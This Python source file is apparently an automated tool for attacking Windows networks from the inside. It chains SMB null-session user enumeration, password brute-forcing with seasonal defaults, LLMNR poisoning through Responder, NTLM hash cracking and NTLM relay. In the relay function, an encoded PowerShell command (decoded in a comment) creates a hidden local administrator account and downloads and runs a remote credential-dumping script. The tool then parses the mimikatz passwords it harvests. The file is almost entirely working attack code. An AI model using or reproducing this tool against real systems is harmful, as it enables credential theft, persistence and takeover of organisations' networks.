#!/usr/bin/env python3

import re
import os
import sys
import time
import string
import signal
import random
import asyncio
import argparse
import functools
import netifaces
from netaddr import IPNetwork, AddrFormatError
from datetime import datetime
from itertools import zip_longest
from libnmap.process import NmapProcess
from subprocess import Popen, PIPE, check_output, CalledProcessError
from asyncio.subprocess import PIPE, STDOUT
from libnmap.parser import NmapParser, NmapParserException
# Prevent JTR error in VMWare
os.environ['CPUID_DISABLE'] = '1'

# debug
from IPython import embed

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
    parser.add_argument("-p", "--password-list", help="Path to password list file")
    parser.add_argument("-s", "--skip", default='', help="Skip [ntlmrelayx/responder/ridenum/john]")
    return parser.parse_args()

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        report = NmapParser.parse_fromfile(args.xml)
    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        sys.exit('[-] CIDR notation only in the host list e.g. 10.0.0.0/24')
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    sys.exit('[-] Error importing host list file. Are you sure you chose the right file?')
        report = nmap_scan(hosts)
    else:
        print('[-] Use the "-x [path/to/nmap-output.xml]" option if you already have an Nmap XML file \
or "-l [hostlist.txt]" option to run an Nmap scan with a hostlist file.')
        sys.exit()
    return report

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    nmap_args = '-sS --script smb-security-mode -n --max-retries 5 -p 445 -oA smb-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/smb-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    while nmap_proc.is_running():
        i += 1
        x = -.5
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print("[*] Nmap running: {} min".format(str(i)))
        time.sleep(1)

def get_hosts(args, report):
    '''
    Gets list of hosts with port 445 open
    and a list of hosts with smb signing disabled
    '''
    hosts = []
    smb_signing_disabled_hosts = []
    smb_script_run = False

    print('[*] Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            # Get open services
            for s in host.services:
                if s.port == 445:
                    if s.state == 'open':
                        ip = host.address
                        print('[+] SMB open: {}'.format(ip))
                        hosts.append(ip)
            # Get SMB signing data
            for script_out in host.scripts_results:
                if script_out['id'] == 'smb-security-mode':
                    smb_script_run = True
                    if 'message_signing: disabled' in script_out['output']:
                        smb_signing_disabled_hosts.append(ip)

    # If nmap user ran didn't do smb-security-mode script, do it now
    if args.xml:
        if len(hosts) > 0:
            if smb_script_run == False:
                print("[*] It appears the NSE script smb-security-mode was not run in your Nmap scan. Running it now")
                report = nmap_scan(hosts)
                hosts, smb_signing_disabled_hosts, smb_script_run = get_hosts(args, report)

    if len(hosts) == 0:
        print('[-] No hosts were found with port 445 open')
    return hosts, smb_signing_disabled_hosts, smb_script_run

def coros_pool(worker_count, commands):
    '''
    A pool without a pool library
    '''
    coros = []
    if len(commands) > 0:
        while len(commands) > 0:
            for i in range(worker_count):
                # Prevents crash if [commands] isn't divisible by 5
                if len(commands) > 0:
                    coros.append(get_output(commands.pop()))
                else:
                    return coros
    return coros

@asyncio.coroutine
def get_output(cmd):
    '''
    Performs async OS commands
    '''
    p = yield from asyncio.create_subprocess_shell(cmd, stdout=PIPE, stderr=PIPE)
    # Output returns in byte string so we decode to utf8
    return (yield from p.communicate())[0].decode('utf8')

def async_get_outputs(loop, commands):
    '''
    Asynchronously run commands and get get their output in a list
    '''
    output = []

    if len(commands) == 0:
        return output

    # Get commands output in parallel
    worker_count = len(commands)
    if worker_count > 10:
        worker_count = 10

    # Create pool of coroutines
    coros = coros_pool(worker_count, commands)

    # Run the pool of coroutines
    if len(coros) > 0:
        output += loop.run_until_complete(asyncio.gather(*coros))

    return output

def create_cmds(hosts, cmd):
    '''
    Creates the list of comands to run
    cmd looks likes "echo {} && rpcclient ... {}"
    '''
    commands = []
    for ip in hosts:
        formatted_cmd = 'echo {} && '.format(ip) + cmd.format(ip)
        commands.append(formatted_cmd)
    return commands

def get_null_sess_hosts(output):
    '''
    Gets a list of all hosts vulnerable to SMB null sessions
    '''
    null_sess_hosts = {}
    # output is a list of rpcclient output
    for out in output:
        if 'Domain Name:' in out:
            out = out.splitlines()
            ip = out[0]
                         # Just get domain name
            dom = out[1].split()[2]
                         # Just get domain SID
            dom_sid = out[2].split()[2]
            null_sess_hosts[ip] = (dom, dom_sid)

    return null_sess_hosts

def print_domains(null_sess_hosts):
    '''
    Prints the unique domains
    '''
    uniq_doms = []
    for key,val in null_sess_hosts.items():
        dom_name = val[0]
        if dom_name not in uniq_doms:
            uniq_doms.append(dom_name)

    if len(uniq_doms) > 0:
        for d in uniq_doms:
            print('[+] Domain found: ' + d) 

def get_usernames(ridenum_output):
    ip_users = {}
    for host in ridenum_output:
        out_lines = host.splitlines()
        ip = out_lines[0]
        for line in out_lines:
                                          # No machine accounts
            if 'Account name:' in line and "$" not in line:
                user = line.split()[2]
                if ip in ip_users:
                    ip_users[ip] += [user]
                else:
                    ip_users[ip] = [user]

    return ip_users

def write_to_file(filename, data):
    with open(filename, 'a+') as f:
        f.write(data)

def create_brute_cmds(ip_users, passwords):
    '''
    Creates the bruteforce commands
    '''
    already_tested = []
    cmds = []
    for ip in ip_users:
        for user in ip_users[ip]:
            if user not in already_tested:
                already_tested.append(user)
                print('[+] User found: ' + user)
                rpc_user_pass = []
                for pw in passwords:
                    #cmds.append('echo {} && rpcclient -U \
                    #"{}%{}" {} -c "exit"'.format(ip, user, pw, ip))
                    cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
                    # This is so when you get the output from the coros
                    # you get the username and pw too
                    cmd2 = "echo '{}' ".format(cmd)+cmd
                    cmds.append(cmd2)

    print('[*] Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
    return cmds

def create_passwords(args):
    '''
    Creates the passwords based on default AD requirements
    or user-defined values
    '''
    if args.password_list:
        with open(args.password_list, 'r') as f:
            # We have to be careful with .strip()
            # because password could contain a space
            passwords = [line.rstrip() for line in f]
    else:
        season_pw = create_season_pw()
        other_pw = "P@ssw0rd"
        passwords = [season_pw, other_pw]

    return passwords

def create_season_pw():
    '''
    Turn the date into the season + the year
    '''
    # Get the current day of the year
    doy = datetime.today().timetuple().tm_yday
    year = str(datetime.today().year)

    spring = range(80, 172)
    summer = range(172, 264)
    fall = range(264, 355)
    # winter = everything else

    if doy in spring:
        season = 'Spring'
    elif doy in summer:
        season = 'Summer'
    elif doy in fall:
        season = 'Fall'
    else:
        season = 'Winter'

    season_pw = season+year
    return season_pw

def parse_brute_output(brute_output):
    '''
    Parse the chunk of rpcclient attempted logins
    '''
    # {'ip':[userpw, userpw2]}
    users_pws = {}
    pw_found = False
    for line in brute_output:
        # Missing second line of output means we have a hit
        if len(line.splitlines()) == 1:
            pw_found = True
            split = line.split()
            ip = split[1]
            user_pw = split[5].replace('"','').replace('%',':')
            if ip in users_pws:
                users_pws[ip] += [user_pw]
            else:
                users_pws[ip] = [user_pw]
            print('[!] Password found! {} on {}'.format(user_pw, ip))

    if pw_found == False:
        print('[-] No password matches found')

    return users_pws

def smb_reverse_brute(loop, hosts, args):
    '''
    Performs SMB reverse brute
    '''
    # {ip:'domain name: xxx', 'domain sid: xxx'}
    null_sess_hosts = {}
    dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
    dom_cmds = create_cmds(hosts, dom_cmd)
    print('[*] Checking for null SMB sessions')
    print('[*] Example command that will run: '+dom_cmds[0].split('&& ')[1])
    rpc_output = async_get_outputs(loop, dom_cmds)
    # We already printed that no sessions were found
    if rpc_output == None:
        print('[-] Error attempting to look up null SMB sessions')
        return

    # {ip:'domain_name', 'domain_sid'}
    chunk_null_sess_hosts = get_null_sess_hosts(rpc_output)

    # Create master list of null session hosts
    null_sess_hosts.update(chunk_null_sess_hosts)
    if len(null_sess_hosts) == 0:
        print('[-] No null SMB sessions available')
        return
    else:
        null_hosts = []
        for ip in null_sess_hosts:
            print('[+] Null session found: {}'.format(ip))
            null_hosts.append(ip)
    print_domains(null_sess_hosts)

    # Gather usernames using ridenum.py
    print('[*] Checking for usernames. This may take a bit...')
    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee logs/ridenum.log'
    ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
    print('[*] Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
    ridenum_output = async_get_outputs(loop, ridenum_cmds)
    if len(ridenum_output) == 0:
        print('[-] No usernames found')
        return

    # {ip:username, username2], ip2:[username, username2]}
    ip_users = get_usernames(ridenum_output)
    passwords = create_passwords(args)

    # Creates a list of unique commands which only tests
    # each username/password combo 2 times and not more
    brute_cmds = create_brute_cmds(ip_users, passwords)
    brute_output = async_get_outputs(loop, brute_cmds)

    # users_pws = {'ip':[userpw, userpw2]}
    # Will always return at least an empty dict()
    users_pws = parse_brute_output(brute_output)
    return users_pws

def log_pwds(users_pws):
    '''
    Turns SMB password data {ip:[usrr_pw, user2_pw]} into a string
    '''
    for k in users_pws:
        ip = k
        for user_pw in users_pws[k]:
            line = '{}: {}\n'.format(ip, user_pw)
            write_to_file('found-passwords.txt', line)

def edit_responder_conf(switch, protocols):
    '''
    Edit responder.conf
    '''
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    conf = 'submodules/Responder/Responder.conf'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        # Make sure the change we're making is necessary
        if re.search(p+' = '+opp_switch, filedata):
            filedata = filedata.replace(p+' = '+opp_switch, p+' = '+switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    ifaces = []
    for iface in netifaces.interfaces():
    # list of ipv4 addrinfo dicts
        ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
        for entry in ipv4s:
            addr = entry.get('addr')
            if not addr:
                continue
            if not (iface.startswith('lo') or addr.startswith('127.')):
                ifaces.append(iface)

    # Probably will only find 1 interface, but in case of more just use the first one
    return ifaces[0]

def run_proc(cmd):
    '''
    Runs single commands
    ntlmrelayx needs the -c "powershell ... ..." cmd to be one arg tho
    '''

    # Set up ntlmrelayx commands
    # only ntlmrelayx has a " in it
    dquote_split = cmd.split('"')
    if len(dquote_split) > 1:
        cmd_split = dquote_split[0].split()
        ntlmrelayx_remote_cmd = dquote_split[1]
        cmd_split.append(ntlmrelayx_remote_cmd)
    else:
        cmd_split = cmd.split()

    for x in cmd_split:
        if 'submodules/' in x:
            filename = x.split('/')[-1] + '.log'
            break
    print('[*] Running: {}'.format(cmd))
    f = open('logs/'+filename, 'a+')
    proc = Popen(cmd_split, stdout=f, stderr=STDOUT)
    return proc

def get_resp_hashes(prev_hashes):
    '''
    Checks the responder log folder for hashes found
    '''
    logdir_path = os.getcwd()+'/submodules/Responder/logs'
    resp_log_files = os.listdir(logdir_path)
    hashes = {}
    for f in resp_log_files:
        if '-NTLM' in f:
            hash_path = logdir_path+'/'+f
            ntlm_hash = open(hash_path, 'r').read()
            if ntlm_hash not in prev_hashes:
                prev_hashes.append(ntlm_hash)
                print('[!] Hash found! '+ f)
                if 'NTLMv1' in f:
                    if 'NTLMv1' in hashes:
                        hashes['NTLMv1'] += [ntlm_hash]
                    else:
                        hashes['NTLMv1'] = [ntlm_hash]
                elif 'NTLMv2' in f:
                    if 'NTLMv2' in hashes:
                        hashes['NTLMv2'] += [ntlm_hash]
                    else:
                        hashes['NTLMv2'] = [ntlm_hash]

    return prev_hashes, hashes

def create_john_cmd(hash_format, hash_file):
    '''
    Create JohnTheRipper command
    '''
    #./john --format=<format> --wordlist=<path> --rules <hashfile>
    cmd = []
    path = 'submodules/JohnTheRipper/run/john'
    cmd.append(path)
    form = '--format={}'.format(hash_format)
    cmd.append(form)
    wordlist = '--wordlist=submodules/10_million_password_list_top_1000000.txt'
    cmd.append(wordlist)
    cmd.append('--rules')
    cmd.append(hash_file)
    john_cmd = ' '.join(cmd)
    return john_cmd

def crack_resp_hashes(hashes):
    '''
    Crack responder-found hashes with john
    The hashes in the func args include usernames, domains, and such
    '''
    procs = []
    identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))

    if len(hashes) > 0:
        # hashes = {'NTLMv1':['user:DOM:host:hash'], 'NTLMv2':['user:DOM:host:hash']}
        for hash_type in hashes:
            filename = '{}-hashes-{}.txt'.format(hash_type, identifier)
            for h in hashes[hash_type]:
                write_to_file(filename, h)
            if 'v1' in hash_type:
                hash_format = 'netntlm'
            elif 'v2' in hash_type:
                hash_format = 'netntlmv2'
            john_cmd = create_john_cmd(hash_format, filename)
            john_proc = run_proc(john_cmd)
            procs.append(john_proc)

    return procs

def get_cracked_pwds(prev_pwds):
    '''
    Check for new cracked passwords
    '''
    dir_contents = os.listdir(os.getcwd())
    for x in dir_contents:
        if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
            out = check_output('submodules/JohnTheRipper/run/john --show {}'.format(x).split())
            for line in out.splitlines():
                line = line.decode('utf8')
                line = line.split(':')
                if len(line) > 3:
                    user = line[0]
                    pw = line[1]
                    host = line[2]
                    user_pw_str = user+':'+pw
                    if user_pw_str not in prev_pwds:
                        prev_pwds.append(user_pw_str)
                        print('[!] Password found! {} on {}'.format(user_pw_str, host))
                        user_pw = {host:[user_pw_str]}
                        log_pwds(user_pw)
    return prev_pwds

def check_avx2_bug(cmd, run_already):
    '''
    JTR's configure script has a bug in VMware Workstation where it thinks AVX2 is in CPU flags
    Fix is to run 'export CPUID_DISABLE=1'
    '''
    out = None
    try:
        out = check_output('submodules/JohnTheRipper/run/john')
    except CalledProcessError as e:
        if out:
            if 'AVX2' in out:
                os.environ['CPUID_DISABLE'] = '1'
                # Prevent infinite loop if JTR complains about avx2 again
                if run_already == False:
                    run_jtr(cmd, True)
                else:
                    print('[-] Error running JohnTheRipper: '+out)
                    return
            else:
                print('[-] Error running JohnTheRipper: '+out)
                return
        else:
            print('[-] Error running JohnTheRipper: '+e)
            return

def start_responder_llmnr():
    '''
    Start Responder alone for LLMNR attack
    '''
    edit_responder_conf('On', ['HTTP', 'SMB'])
    iface = get_iface()
    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
    resp_proc = run_proc(resp_cmd)
    print('[*] Responder-Session.log:')
    return resp_proc

def run_relay_attack():
    '''
    Start ntlmrelayx for ntlm relaying
    '''
    iface = get_iface()
    edit_responder_conf('Off', ['HTTP', 'SMB'])
    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
    resp_proc = run_proc(resp_cmd)

# net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py'
                ' -of ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
                ' -c "powershell -nop -exec bypass -w hidden -enc '
                'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
    ntlmrelay_proc = run_proc(relay_cmd)
    return ntlmrelay_proc

def follow_file(thefile):
    '''
    Works like tail -f
    Follows a constantly updating file
    '''
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def check_ntlmrelay_error(line, file_lines):
    '''
    Checks for ntlmrelay errors
    '''
    if 'Traceback (most recent call last):' in line:
        print('[-] Error running ntlmrelayx:\n')
        for l in file_lines:
            print(l.strip())
        print('\n[-] Hit CTRL-C to quit')
        return True
    else:
        return False

def get_ntlmrelay_hashes(line):
    '''
    Parses ntlmrelayx output for hashes
    '''
    version, ntlm_hash = (None, None)
    if line.count(':') == 4:
        version = 'v2'
        ntlm_hash = line.strip()
        return (version, ntlm_hash)
    elif line.count(':') == 5:
        version = 'v1'
        ntlm_hash = line.strip()
        return (version, ntlm_hash)
    else:
        return (version, ntlm_hash)

def format_mimi_data(dom, user, auth, hash_or_pw, prev_hashes, prev_pwds):
    user_pw = user+':'+auth
    if hash_or_pw == 'Password':
        if user_pw not in prev_pwds:
            prev_pwds.append(user_pw)
            # log_pwds requires format {ip:[user_pw, user_pw2]}
            log_pwds({dom:[user_pw]})
            print('[!] {} found! {}'.format(hash_or_pw, user_pw))
    else:
        if user_pw not in prev_hashes:
            prev_hashes.append(user_pw)
            print('[!] {} found! {}'.format(hash_or_pw, user_pw))

    return prev_pwds, prev_hashes

def parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line):
    '''
    Parses mimikatz output for usernames and passwords
    '''
    splitl = line.split(':')
    user = None
    dom = None
    ntlm = None

    if "* Username" in line:
        if mimi_data['user']:
            user = mimi_data['user']
            if user != '(null)' and mimi_data['dom']:
                dom = mimi_data['dom']
                # Prevent (null) and hex passwords from being stored
                if mimi_data['pw']:
                    prev_pwds, prev_hashes = format_mimi_data(dom, user, mimi_data['pw'], 'Password', prev_hashes, prev_pwds)
                elif mimi_data['ntlm']:
                    prev_pwds, prev_hashes = format_mimi_data(dom, user, mimi_data['ntlm'], 'Hash', prev_hashes, prev_pwds)

        user = splitl[-1].strip()
        if user != '(null)':
            mimi_data['user'] = user
        mimi_data['dom'] = None
        mimi_data['ntlm'] = None
        mimi_data['pw'] = None
    elif "* Domain" in line:
        mimi_data['dom'] = splitl[-1].strip()
    elif "* NTLM" in line:
        ntlm = splitl[-1].strip()
        if ntlm != '(null)':
            mimi_data['ntlm'] = splitl[-1].strip()
    elif "* Password" in line:
        pw = splitl[-1].strip()
        if pw != '(null)' and pw.count(' ') < 15:
            mimi_data['pw'] = splitl[-1].strip()

    return prev_pwds, prev_hashes, mimi_data

def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines):
    '''
    Gets and cracks responder hashes
    Avoids getting and cracking previous hashes
    '''
    new_lines = []
    if 'john' not in args.skip:
        prev_hashes, hashes = get_resp_hashes(prev_hashes)
        john_proc = crack_resp_hashes(hashes)
        prev_pwds = get_cracked_pwds(prev_pwds)

    # Print responder-session.log output so we know it's running
    path = 'submodules/Responder/logs/Responder-Session.log'
    if os.path.isfile(path):
        with open(path, 'r') as f:
            contents = f.readlines()
            for line in contents:
                if line not in prev_lines:
                    new_lines.append(line)
                    print('    [*] '+line.strip())
    # We don't want a separate john proc for each hash so we wait 30s between checks
    time.sleep(30)

    return prev_hashes, prev_pwds, new_lines

def signal_handler(signal, frame):
    '''
    Catch CTRL-C and kill procs
    '''
    print('\n[-] CTRL-C caught, cleaning up and closing')

    cleanup_resp()
    pn = Popen("ps aux | grep -i 'ntlmrelayx.py -' | grep -v grep | awk '{print $2}' | xargs kill".split(), stdout=PIPE, stderr=PIPE, shell=True)
    print(pn.communicate())

    # Cleanup hash files
    ntlm_files = []
    for fname in os.listdir(os.getcwd()):
        if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
            ntlm_files.append(fname)

    for fname in ntlm_files:
        if 'v1' in fname:
            v1_file = open('NTLMv1-hashes.txt', 'a+')
            with open(fname) as infile1:
                v1_file.write(infile1.read())
                #os.remove(fname)
        elif 'v2' in fname:
            with open(fname) as infile2:
                v2_file = open('NTLMv2-hashes.txt', 'a+')
                v2_file.write(infile2.read())
                #os.remove(fname)
    sys.exit()

def cleanup_resp():
    '''
    Kill responder and move the log file
    '''
    p = Popen("ps aux | grep -i 'responder.py -' | grep -v grep | awk '{print $2}' | xargs kill -s SIGINT".split(),
              stdout=PIPE, stderr=PIPE, shell=True)
    path = 'submodules/Responder/logs/Responder-Session.log'
    timestamp = str(time.time())
    os.rename(path, path+'-'+timestamp)

def main(report, args):
    '''
    Performs:
        SMB reverse bruteforce
        Responder LLMNR poisoning
        SMB relay
        Hash cracking
    '''
    prev_hashes = []
    prev_pwds = []
    loop = asyncio.get_event_loop()

    # get_hosts will exit script if no hosts are found
    hosts, smb_signing_disabled_hosts, smb_script_run = get_hosts(args, report)
    if len(hosts) > 0:
        for host in smb_signing_disabled_hosts:
            write_to_file('smb-signing-disabled-hosts.txt', host+'\n')

        if 'ridenum' not in args.skip.lower():
            print('[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
            users_pws = smb_reverse_brute(loop, hosts, args)
            if users_pws != None:
                log_pwds(users_pws)


    # ATTACK 2: LLMNR poisoning
    if 'responder' not in args.skip.lower():
        print('[*] Attack 2: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
        prev_lines = []
        resp_proc = start_responder_llmnr()
        time.sleep(2)

        # Check for hashes for 10m
        timeout = time.time() + 60 * 10
        try:
            while time.time() < timeout:
                prev_hashes, prev_pwds, new_lines = get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines)
                prev_lines += new_lines
        except KeyboardInterrupt:
            pass
        print('\n[-] Killing Responder.py and moving on')
        cleanup_resp()
        # Give responder some time to die
        time.sleep(3)

    # ATTACK 3: NTLM relay
    if 'relay' not in args.skip.lower():
        if len(hosts) > 0:
            print('[*] Attack 3: NTLM relay')
            ntlmrelay_proc = run_relay_attack()
        else:
            sys.exit('[-] No SMB hosts to attack with ntlmrelay')

    # CTRL-C handler
    signal.signal(signal.SIGINT, signal_handler)

    mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
    while 1:
        print('[*] ntlmrelayx.py output:')
        ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
        file_lines = follow_file(ntlmrelay_file)
        for line in file_lines:

            # check for errors
            #error = check_ntlmrelay_error(line, file_lines)            mimikatz error
            if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
                # First few lines of mimikatz logo start with '   ' and have #### in them
                if '####' not in line:
                    print(line.strip())

            # ntlmrelayx output
            if re.search('\[.\]', line):
                print('  '+line.strip())

            # Find hashes
            #version, ntlm_hash = get_ntlmrelay_hashes(line)
            #if version != None:
            #    pass
                # PASS HASH INTO PREV_HASHES AND STUFF

            # Parse mimikatz
            prev_pwds, prev_hashes, mimi_data = parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        exit('[-] Run as root')
    report = parse_nmap(args)
    main(report, args)


# WHERE I LEFT OFF
    # TO DO
    # create crack_relay_hashes
    # Also figure out whether ridenum from github needs python2 or 3
    # add jenkins/websphere deserialization
    # why does john not crack the hashes responder captured on marcello's network; check phone pictures for paste
    # check netlmrelay output for succeeeded command and add icebreaker:password to found-passwords
    #   [*] Executed specified command on host: 192.168.10.22
    # quick 2 password bruteforce on repsonder usernames

